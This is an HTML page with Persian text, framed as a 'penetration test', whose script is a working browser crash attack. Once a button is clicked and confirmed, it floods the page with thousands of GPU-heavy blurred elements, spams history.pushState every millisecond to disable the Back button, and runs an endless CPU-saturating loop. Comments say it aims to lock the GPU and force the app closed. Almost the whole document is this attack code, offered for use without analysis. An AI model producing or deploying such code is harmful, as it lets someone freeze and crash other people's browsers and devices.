<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>NEXUS ULTIMATE CRASH TEST</title>
    <style>
        body { background: #000; color: #00f2fe; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn-crash { 
            background: linear-gradient(45deg, #ff0000, #990000); 
            color: white; border: none; padding: 20px 40px; 
            font-size: 20px; font-weight: bold; border-radius: 50px; 
            cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.5);
        }
    </style>
</head>
<body>

    <h1>تست نفوذ: کرش کلی اپلیکیشن</h1>
    <p>این کد موتور رندرینگ (GPU) را هدف قرار می‌دهد.</p>
    
    <button id="crashBtn" class="btn-crash">اجرای CRASH سنگین</button>

    <script>
        document.getElementById('crashBtn').addEventListener('click', function() {
            if(confirm("آیا برای کرش کامل اپلیکیشن آماده هستید؟")) {
                startExploit();
            }
        });

        function startExploit() {
            // ۱. ایجاد نشت حافظه گرافیکی (Graphics Memory Leak)
            // ایجاد هزاران المان با سایه و فیلترهای سنگین که GPU را قفل می‌کند
            setInterval(() => {
                for(let i = 0; i < 500; i++) {
                    let div = document.createElement('div');
                    div.style.cssText = `
                        position: fixed;
                        top: ${Math.random()*100}%;
                        left: ${Math.random()*100}%;
                        width: 100px; height: 100px;
                        box-shadow: 0 0 100px 50px red;
                        backdrop-filter: blur(50px);
                        border-radius: 50%;
                        z-index: ${i};
                    `;
                    document.body.appendChild(div);
                }
            }, 10);

            // ۲. بمباران تاریخچه (History Bomb)
            // این کار باعث می‌شود دکمه Back گوشی هم از کار بیفتد و مرورگر هنگ کند
            setInterval(() => {
                window.history.pushState(null, "", "?crash=" + Math.random());
            }, 1);

            // ۳. حلقه مرگ (Infinite Recursion & Processing)
            // این بخش پردازنده را به ۱۰۰٪ می‌رساند تا سیستم‌عامل دستور بسته شدن برنامه را صادر کند
            function crashLoop() {
                let x = "REZA_CRASH".repeat(10000);
                console.log(x);
                // فراخوانی بازگشتی فوق سریع
                setTimeout(crashLoop, 0);
                while(true) {
                    Math.sqrt(Math.random() * 999999);
                }
            }
            
            crashLoop();
        }
    </script>
</body>
</html>
